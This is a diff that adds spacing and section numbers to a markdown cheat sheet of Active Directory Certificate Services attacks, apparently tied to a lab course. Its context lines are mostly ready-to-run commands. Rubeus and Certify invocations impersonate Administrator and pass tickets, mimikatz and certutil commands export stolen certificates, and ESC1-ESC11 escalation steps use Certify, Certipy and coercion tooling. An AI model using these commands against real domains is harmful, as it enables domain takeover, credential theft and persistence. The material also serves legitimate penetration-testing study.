@@ -108,6 +108,7 @@ Enumerate Trusted Root Certification Authorities Root store:
 certutil -store -enterprise Root
 ```
 
+<br>
 
 ### <a name="12"></a>1.2 Request (PERSIST1)
 
@@ -116,23 +117,27 @@ C:\Tools\Certify.exe find
 C:\Tools\Certify.exe request /ca:CA_NAME /user:USER /domain:DOMAIN /template:TEMPLATE_NAME
 ```
 
+<br>
 
-### <a name="13"></a>Certpotato
+### <a name="13"></a>1.3 Certpotato
 
 ```
 C:\Tools\Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:cifs|http|.../MACHINE.DOMAIN /dc:DC.DOMAIN /user:COMPUTER_NAME$ /rc4:HASH /ptt
 C:\Tools\Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:cifs|http|.../MACHINE.DOMAIN /dc:DC.DOMAIN /user:COMPUTER_NAME$ /ticket:TICKET.kirbi /ptt
 ```
 
+<br>
 
-### <a name="14"></a>UnPAC-The-Hash (THEFT5)
+### <a name="14"></a>1.4 UnPAC-The-Hash (THEFT5)
 
 ```
 C:\Tools\Rubeus.exe asktgt /getcredentials /user:COMPUTER_NAME$ /certificate:C:\Certs\COMPUTER_NAME.pfx /password:PASSWORD /domain:DOMAIN /dc:DC.DOMAIN /show
 ```
 
 
-### <a name="15"></a>Conversion 
+<br>
+
+### <a name="15"></a>1.5 Conversion 
 
 Convert .pem to .pfx certificate:
 
@@ -141,7 +146,9 @@ C:\Tools\openssl\openssl.exe pkcs12 -in C:\Certs\USER.pem -keyex -CSP "Microsoft
 ```
 
 
-### <a name="16"></a>Export (THEFT1)
+<br>
+
+### <a name="16"></a>1.6 Export (THEFT1)
 
 Using certutil:
 
@@ -170,8 +177,9 @@ $mypwd = ConvertTo-SecureString -String "PASSWORD" -Force -AsPlainText
 Export-PfxCertificate -Cert Cert:\LocalMachine\My\CERTIFICATE_HASH -FilePath C:\Users\Public\USER.pfx -Password $mypwd
 ```
 
+<br>
 
-### <a name="17"></a>Export - DPAPI (THEFT2 and THEFT3)
+### <a name="17"></a>1.7 Export - DPAPI (THEFT2 and THEFT3)
 
 Export certificates from the User:
 
@@ -189,7 +197,9 @@ crypto::certificates /export /systemstore:LOCAL_MACHINE
 ```
 
 
-### <a name="18"></a>Parse
+<br>
+
+### <a name="18"></a>1.8 Parse
 
 Parse certificates:
 
@@ -199,8 +209,9 @@ certutil -v -dump C:\Certs\USER.pfx
 certutil -v -dump -p "PASSWORD" C:\Certs\CERT.pfx
 ```
 
+<br>
 
-### <a name="19"></a>Install
+### <a name="19"></a>1.9 Install
 
 ```
 C:\Users\Public\CertifyKit.exe list /certificate:C:\Users\Public\CERT.pfx /password:PASSWORD /install
@@ -209,15 +220,18 @@ C:\Users\Public\CertifyKit.exe list /certificate:C:\Users\USER\EncryptedFiles\US
 ```
 
 
-### <a name="110"></a>Renew (PERSIST3)
+<br>
+
+### <a name="110"></a>1.10 Renew (PERSIST3)
 
 ```
 certreq -enroll -user -q -PolicyServer * -cert CERT_HASH renew reusekeys
 certreq -enroll -user -q -cert CERT_HASH renew
 ```
 
+<br>
 
-### <a name="111"></a>Pass-The-Cert
+### <a name="111"></a>1.11 Pass-The-Cert
 
 ```
 C:\Tools\Rubeus.exe asktgt /user:USER /certificate:C:\Certs\USER.pfx /password:PASSWORD /domain:DOMAIN /dc:DC.DOMAIN /nowrap /ptt
@@ -229,7 +243,7 @@ C:\Tools\Rubeus.exe asktgt /user:USER /certificate:C:\Certs\USER.pfx /password:P
 
 # <a name="2"></a>ESCx Abuses
 
-### <a name="21"></a>ESC1
+### <a name="21"></a>2.1 ESC1
 
 Conditions:
 
@@ -256,8 +270,9 @@ Exploitation:
 C:\Users\Public\Certify.exe request /ca:CA_NAME /template:TEMPLATE_NAME /altname:administrator /sidextension:DOMAIN_SID-500 /domain:DOMAIN
 ```
 
+<br>
 
-### <a name="22">ESC2
+### <a name="22">2.2 ESC2
 
 Conditions: 
 
@@ -284,8 +299,9 @@ Exploitation:
 C:\Users\Public\Certify.exe request /ca:CA_NAME /template:TEMPLATE_NAME /altname:administrator /sidextension:DOMAIN_SID-500 /domain:DOMAIN
 ```
 
+<br>
 
-### <a name="23">ESC3
+### <a name="23">2.3 ESC3
 
 
 Template 1: Provides Enrollment Agent Certificate
@@ -322,8 +338,9 @@ Use the Enrollment Agent certificate to enroll in a template (TEMPLATE_NAME_2) o
 C:\Tools\Certify.exe request /ca:CA_NAME /template:TEMPLATE_NAME_2 /onbehalfof:DOMAIN\administrator /enrollcert:C:\Certs\esc3-enrollmentAgent.pfx /enrollcertpw:PASSWORD /domain:DOMAIN
 ```
 
+<br>
 
-### <a name="24">ESC4
+### <a name="24">2.4 ESC4
 
 Condition: 
 
@@ -354,7 +371,9 @@ C:\Tools\StandIn\StandIn_v13_Net45.exe --adcs --filter User --ntaccount DOMAIN\U
 ```
 
 
-### <a name="25">ESC7.1
+<br>
+
+### <a name="25">2.5 ESC7.1
 
 Condition:
 
@@ -404,7 +423,9 @@ certipy ca -u USER@internalDOMAIN -hashes 'HASHES:HASHES' -ca 'CA_NAME' -dc-ip D
 ```
 
 
-### <a name="26">ESC8
+<br>
+
+### <a name="26">2.6 ESC8
 
 Condition: 
 
@@ -438,7 +459,9 @@ source coercer_venv/bin/activate
 
 
 
-### <a name="27">ESC11
+<br>
+
+### <a name="27">2.7 ESC11
 
 Condition: 
 
@@ -467,7 +490,7 @@ source coercer_venv/bin/activate
 
 ----------------------------------
 
-# <a name="3">Sources
+# <a name="3">3. Sources
 
 - [Altered Security - ADCS lab](https://www.alteredsecurity.com/adcs): This is the course, highly recommended to complete the labs.
 
